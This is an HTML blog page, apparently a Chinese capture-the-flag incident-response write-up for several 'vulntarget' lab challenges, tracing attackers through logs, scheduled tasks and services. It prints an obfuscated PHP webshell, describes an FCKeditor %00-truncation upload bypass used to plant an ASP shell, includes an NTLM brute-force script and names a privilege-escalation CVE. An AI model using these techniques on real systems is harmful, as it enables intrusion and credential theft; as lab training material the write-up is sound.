@@ -1,0 +1,260 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>玄机-应急响应-vulntarget | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="应急响应-vulntarget-b-011黑客是从哪个端口作为入口点的 使用ss -lntup进行查看被监听的端口 cat install.sh，有如下内容 12345678firewall-cmd --permanent --zone&#x3D;public --add-port&#x3D;20&#x2F;tcp &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1firewall-cmd --permanent --zon">
+<meta property="og:type" content="article">
+<meta property="og:title" content="玄机-应急响应-vulntarget">
+<meta property="og:url" content="http://example.com/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/index.html">
+<meta property="og:site_name" content="cheng_xing&#39;s blog">
+<meta property="og:description" content="应急响应-vulntarget-b-011黑客是从哪个端口作为入口点的 使用ss -lntup进行查看被监听的端口 cat install.sh，有如下内容 12345678firewall-cmd --permanent --zone&#x3D;public --add-port&#x3D;20&#x2F;tcp &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1firewall-cmd --permanent --zon">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/ltx.jpg">
+<meta property="article:published_time" content="2025-05-01T03:59:50.000Z">
+<meta property="article:modified_time" content="2025-05-04T06:59:44.663Z">
+<meta property="article:author" content="cheng_xing">
+<meta property="article:tag" content="应急响应">
+<meta property="article:tag" content="FCKeditor">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/ltx.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "玄机-应急响应-vulntarget",
+  "url": "http://example.com/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/",
+  "image": "http://example.com/img/ltx.jpg",
+  "datePublished": "2025-05-01T03:59:50.000Z",
+  "dateModified": "2025-05-04T06:59:44.663Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "cheng_xing",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/ltx.jpg"><link rel="canonical" href="http://example.com/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '玄机-应急响应-vulntarget',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">玄机-应急响应-vulntarget</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">玄机-应急响应-vulntarget</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-01T03:59:50.000Z" title="发表于 2025-05-01 11:59:50">2025-05-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-04T06:59:44.663Z" title="更新于 2025-05-04 14:59:44">2025-05-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/forensics/">forensics</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="应急响应-vulntarget-b-01"><a href="#应急响应-vulntarget-b-01" class="headerlink" title="应急响应-vulntarget-b-01"></a>应急响应-vulntarget-b-01</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>黑客是从哪个端口作为入口点的</p>
+<p>使用ss -lntup进行查看被监听的端口<br><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/1.png" alt="alt text"></p>
+<p>cat install.sh，有如下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=public --add-port=20/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=21/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=22/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=80/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=443/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=$&#123;panelPort&#125;/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=$&#123;sshPort&#125;/tcp &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=39000-40000/tcp &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>这里是使用宝塔作为控制面板的，在宝塔的脚本里面，可以看到宝塔打开的所以端口命令，与上图进行比较，可以发现81端口不是宝塔默认打开的端口，所以认为黑客是将81端口作为他的监控端口和入口点的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;81&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>黑客使用了什么工具探测了ssh服务</p>
+<p>cd &#x2F;www&#x2F;wwwlogs<br>cat access.log，发现使用了Nmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Nmap&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>黑客使用了什么工具扫描了日录(格式flag{工具&#x2F;版本号})</p>
+<p>cat 127.0.0.1.log，发现gobuster&#x2F;3.6</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;gobuster/3.6&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>黑客成功登录后台的IP地址?</p>
+<p>同上题，127.0.0.1.log中显示黑客IP为192.168.83.1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.83.1&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>黑客上传的木马连接密钥是什么?</p>
+<p>在127.0.0.1.log中找POST数据报文<br>发现这一条比较可疑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.83.1 - - [18/Nov/2024:22:42:53 +0800] &quot;POST /fileManage/f.php?p=&amp;edit=index.php HTTP/1.1&quot; 200 32 &quot;http://192.168.83.159:81/fileManage/f.php?p=&amp;edit=index.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0&quot;</span><br></pre></td></tr></table></figure>
+<p>成功登录后编辑了index.php</p>
+<p>查看index.php，发现一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Admin@@&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>黑客留下的后门文件的路径为?</p>
+<p>在tmp目录下发现index.elf，下载到本地直接报毒了，应该就是这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/tmp/index.elf&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="应急响应-vulntarget-j-01"><a href="#应急响应-vulntarget-j-01" class="headerlink" title="应急响应-vulntarget-j-01"></a>应急响应-vulntarget-j-01</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>主站进入后台的文件名称(格式flag{xxxxxxxxxx.php})</p>
+<p>查看apache日志，找到以下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /FNeSOgYGkp.php/index/login?url=%2FFNeSOgYGkp.php%2F</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FNeSOgYGkp.php&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p>黑客是从哪个端口上传木马文件的?</p>
+<p>phpstudy中只有80和7001两个端口，7001打不开，那就是80</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;80&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><p>黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{flag(名称:密码)}</p>
+<p>在api3.php中找到木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php // 连接密码: Admin ?&gt; &lt;?php $GFTe=create_function(chr(0x2688/0x112).chr(0272332/01476).str_rot13(&#x27;b&#x27;).chr(525-416).base64_decode(&#x27;ZQ==&#x27;),chr(61206/606).chr(0176230/01044).str_rot13(&#x27;n&#x27;).str_rot13(&#x27;y&#x27;).str_rot13(&#x27;(&#x27;).str_rot13(&#x27;$&#x27;).chr(89700/780).chr(0450-0271).str_rot13(&#x27;z&#x27;).str_rot13(&#x27;r&#x27;).str_rot13(&#x27;)&#x27;).chr(753-694));$GFTe(base64_decode(&#x27;NTE3M&#x27;.&#x27;TA4O0&#x27;.&#x27;BldkF&#x27;.&#x27;sKCRf&#x27;.&#x27;&#x27;.chr(0x325-0x2d0).base64_decode(&#x27;RQ==&#x27;).chr(030465/0335).str_rot13(&#x27;G&#x27;).chr(49794/579).&#x27;&#x27;.&#x27;&#x27;.str_rot13(&#x27;S&#x27;).base64_decode(&#x27;dA==&#x27;).str_rot13(&#x27;O&#x27;).chr(0xd12e/0x253).chr(01735-01626).&#x27;&#x27;.&#x27;1pbl0&#x27;.&#x27;pOzE1&#x27;.&#x27;NTEzM&#x27;.&#x27;jQ7&#x27;.&#x27;&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;api3.php:Admin&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p>黑客攻击机IP地址是多少(因模拟环境故为内网地址)</p>
+<p>apache日志里的就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.112.123&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="应急响应-vulntarget-j-02"><a href="#应急响应-vulntarget-j-02" class="headerlink" title="应急响应-vulntarget-j-02"></a>应急响应-vulntarget-j-02</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p>服务器xuanji用户密码是什么</p>
+<p>161.189.169.137:18000是个fckeditor</p>
+<p>查找这个编辑器的漏洞利用，使用这两个地址，进行尝试查看版本号<br>&#x2F;fckeditor&#x2F;editor&#x2F;dialog&#x2F;fck_about.html<br>&#x2F;ckeditor&#x2F;CHANGES.html</p>
+<p>查看到版本号为2.6.4.1</p>
+<p>然后测试FCKeditor上传点<br>test文件的上传地址<br>FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;test.html<br>FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;upload&#x2F;test.html<br>FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html<br>FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;uploadtest.html<br>发现只有后面两条存在上传点</p>
+<p><a target="_blank" rel="noopener" href="http://161.189.169.137:18000/editor/filemanager/connectors/uploadtest.html%E5%8F%AF%E4%BB%A5%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6">http://161.189.169.137:18000/editor/filemanager/connectors/uploadtest.html可以上传文件</a><br>fckeditor &lt;&#x3D; 2.6.8 for asp 运用%00截断绕过。</p>
+<p>进行%00截断</p>
+<p><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/2.png" alt="alt text"></p>
+<p>注意要在hex视图编辑%00<br><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/3.png" alt="alt text"></p>
+<p>上传后，发现它把”.”和其他字符转义成了”_”</p>
+<p><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/4.png" alt="alt text"></p>
+<p>再点一次上传，发现上传成功了一个asp文件，使用这个地址进行连接</p>
+<p><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/5.png" alt="alt text"></p>
+<p>连接成功</p>
+<p><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/6.png" alt="alt text"></p>
+<p>在C盘下，发现了一个图片1.png和密码本.xls</p>
+<p>这里得到了xuanji这个账户的NTLM哈希值和大概的密码 H????vX97HMhM7T0rtv0<br>这里需要NTLM哈希值进行爆破</p>
+<p>爆破脚本,找到密码: H6Du4vX97HMhM7T0rtv0</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_ntlm_hash</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 计算字符串的NTLM哈希值 &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.new(<span class="string">&#x27;md4&#x27;</span>, password.encode(<span class="string">&#x27;utf-16le&#x27;</span>)).hexdigest().upper()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>():</span><br><span class="line">    target_hash = <span class="string">&quot;F7F2310C1233353705CA169324BCBE37&quot;</span></span><br><span class="line">    prefix = <span class="string">&quot;H&quot;</span></span><br><span class="line">    suffix = <span class="string">&quot;vX97HMhM7T0rtv0&quot;</span></span><br><span class="line">    charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>  <span class="comment"># 可自定义字符集</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成所有可能的4字符组合</span></span><br><span class="line">    <span class="keyword">for</span> chars <span class="keyword">in</span> itertools.product(charset, repeat=<span class="number">4</span>):</span><br><span class="line">        candidate = prefix + <span class="string">&#x27;&#x27;</span>.join(chars) + suffix</span><br><span class="line">        current_hash = generate_ntlm_hash(candidate)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_hash == target_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 找到密码: <span class="subst">&#123;candidate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[- 未找到匹配的密码&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    brute_force()</span><br></pre></td></tr></table></figure>
+
+<p>因为之前进行端口扫描的时候有个3389端口打开着，所以使用rdp进行登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;H6Du4vX97HMhM7T0rtv0&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h3><p>hacker添加的恶意用户是什么</p>
+<p>使用net user进行查看，提交了一遍，发现没有正确的答案</p>
+<p>去查看一下powershell的历史命令<br>地址:C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine<br>发现hacker删除了他自己建立的恶意用户</p>
+<p><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/7.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;admin$&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h3><p>hacker添加的计划任务后门，恶意程序名称是什么</p>
+<p>打开计划任务管理taskschd.msc,这里发现一个MyBackdoor的计划任务，查看操作，发现这个cmd.exe的文件路径很奇怪<br>正常的cmd.exe文件应该是C:\Windows\System32\cmd.exe，所以判断恶意程序的名称为cmd.exe</p>
+<p><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/8.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cmd.exe&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h3><p>hacker添加的恶意服务名称是什么</p>
+<p>sc query state&#x3D; all 使用这条命令，列出所有服务，将其导入到一个txt文本里面进行分析<br>Redis：如果系统不需要Redis服务，突然出现可能可疑。<br>使用sc qc Redis 进行查看，发现它的启动程序又为一个不知名的cmd2.exe程序进行启动的<br>所以判断Redis为恶意服务名称</p>
+<p><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/9.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Redis&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h3><p>hacker还添加了一种劫持后门，修改的windows本地可执行文件名称是什么</p>
+<p>劫持后门可能涉及到系统文件替换。比如，utilman.exe被替换为cmd.exe，这样在登录界面可以通过轻松访问功能调出cmd，从而进行系统操作。或者，可能修改了环境变量中的路径，将常见的程序如notepad.exe指向恶意文件。需要检查系统目录中是否有异常的可执行文件，或者查看最近被修改的系统文件的时间戳。<br>答案可能类似于utilman.exe或者sethc.exe，这些常被用于辅助功能劫持<br>所以进行尝试，答案为sethc.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sethc.exe&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h3><p>hacker上传的木马文件路径是什么，请通过iis服务器日志获取haker上传的木马文件访问路径</p>
+<p>iis的默认路径为C:\inetpub\logs\LogFiles&lt;站点名称&gt;<br>但是访问iss服务器日志需要管理员权限，所以需要使用exp进行提权<br>使用ver进行查看系统版本为 Windows Server 2019<br>使用CVE-2020-0787进行提权</p>
+<p>运行完会弹出一个窗口，使用net user xxx xxx 进行修改管理员账户的密码进行登录<br><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/10.png" alt="alt text"><br>这里登入到管理员权限的账户上<br>进行对网址目录下的文件机进行扫描，发现一个5(1).asp的木马，不是我传的<br><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/11.png" alt="alt text"><br>对iis日志文件进行查找5(1).asp这串字符<br><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/12.png" alt="alt text"><br>最后在这个日志中找到，得到上传的木马文件访问路径为&#x2F;upload&#x2F;image&#x2F;5(1).asp<br><img src="/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/13.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/upload/image/5(1).asp&#125;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/">http://example.com/2025/05/01/%E7%8E%84%E6%9C%BA-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><a class="post-meta__tags" href="/tags/FCKeditor/">FCKeditor</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" 